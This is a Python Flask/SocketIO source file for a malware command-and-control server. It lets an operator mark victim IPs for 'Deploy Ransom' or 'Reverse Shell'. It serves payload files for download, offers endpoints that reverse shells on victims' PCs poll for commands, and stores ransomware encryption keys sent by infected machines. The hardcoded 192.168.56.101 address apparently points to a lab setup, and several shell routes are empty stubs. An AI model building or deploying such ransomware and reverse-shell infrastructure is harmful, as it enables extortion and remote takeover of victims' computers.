from flask import Flask, jsonify, request, send_from_directory
from flask_socketio import SocketIO

app = Flask(__name__)
socketio = SocketIO(app)

# Initialize counters
endpoint1_counter = 0
endpoint2_counter = 0

# Initialize a dictionary to store request counts for each IP
ip_counts = {}

current_client_ip = None


def record_request(client_ip):
    if client_ip not in ip_counts:
        ip_counts[client_ip] = {'shell': False, 'ransom': False}


@app.route('/get-file/<filename>')
def get_file(filename):
    directory = "files"  # Directory where the file is located
    return send_from_directory(directory, filename, as_attachment=True)


@app.route('/endpoint1', methods=['GET'])
def endpoint1():
    client_ip = request.remote_addr
    record_request(client_ip)
    socketio.emit('reset_timer', {'ip': client_ip})

    global current_client_ip
    flag1_status = ip_counts[client_ip]['ransom']
    flag2_status = ip_counts[client_ip]['shell']

    print(ip_counts)

    shell_value = ip_counts[client_ip]['shell']

    if shell_value:
        ip_counts[client_ip]['shell'] = False

    return jsonify({
        "message": "Endpoint 1 was called",
        "ransom_activate": flag1_status,
        "open_shell": shell_value,
        "client_ip": current_client_ip
    })


@socketio.on('action_event')
def handle_action_event(data):
    ip = data['ip']
    action = data['action']
    print(f"Received action '{action}' for IP: {ip}")
    if action == "Deploy Ransom":
        ip_counts[ip]['ransom'] = True
    elif action == "Reverse Shell":
        ip_counts[ip]['shell'] = True


@socketio.on('request_all_ips')
def handle_request_all_ips():
    # Emit an event with the current list of connected IPs
    global current_client_ip
    current_client_ip = request.remote_addr
    print("Client connected from IP", current_client_ip)
    socketio.emit('all_ips', {'ip_counts': ip_counts})


#Endpoints used by the reverse shells in the victims' PCs

@app.route('/register', methods=['POST'])
def register_new_shell():
    pass

@app.route('/should-open-shell', methods=['GET'])
def should_reverse_shell_be_opened():
    return jsonify({'result': True})


@app.route('/request-shell-command', methods=['GET'])
def get_shell_command():
    pass


@app.route('/close-shell', methods=['POST'])
def close_shell():
    pass


@app.route('/save-key', methods=['POST'])
def receive_data():
    # Access the data sent with the POST request
    client_ip =  "192.168.56.101"
    data_received = request.form

    key_str = data_received.get('key')
    if key_str:
        ip_counts[client_ip]['encrypted'] = True
        ip_counts[client_ip]['key'] = key_str
        print(f'Encrypted IP {client_ip}')
        return jsonify({"message": "Key stored successfully"}), 200
    else:
        return jsonify({"error": "No key provided"}), 400
    
@app.route('/get-key', methods=['GET'])
def get_key():
    # Access the data sent with the POST request
    client_ip = "192.168.56.101"
    key_str = ip_counts[client_ip]['key']
    
    return jsonify(key_str), 200
    




if __name__ == "__main__":
    socketio.run(app, debug=True, host="0.0.0.0", port=3000, allow_unsafe_werkzeug=True)
